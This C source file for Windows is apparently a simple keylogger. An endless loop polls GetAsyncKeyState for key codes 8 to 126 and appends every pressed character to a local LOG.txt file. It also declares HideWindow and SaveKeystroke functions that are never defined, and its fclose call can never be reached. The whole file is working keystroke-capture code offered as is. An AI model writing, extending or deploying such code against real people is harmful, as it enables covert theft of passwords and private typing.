#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// FUNCTION DEFINITIONS //
void HideWindow();
void SaveKeystroke();

// MAIN FUNCTION //
int main(){
    FILE* logfile;
    logfile = fopen("LOG.txt", "w");
    while(1){
        
        // loop thru all keyboard characters not including ASCII extended characters
        for(char key = 8; key <= 126; key++){
            
            // check for key press
            // where -32767 means key is pressed
            // and 0 means key is not pressed
            if(GetAsyncKeyState(key) == -32767){
                printf("You pressed a key! ");
                fprintf(logfile, "%c \n", key);
            }
        }
    }
    fclose(logfile);
    return 0;
}

// HELPER FUNCTIONS //
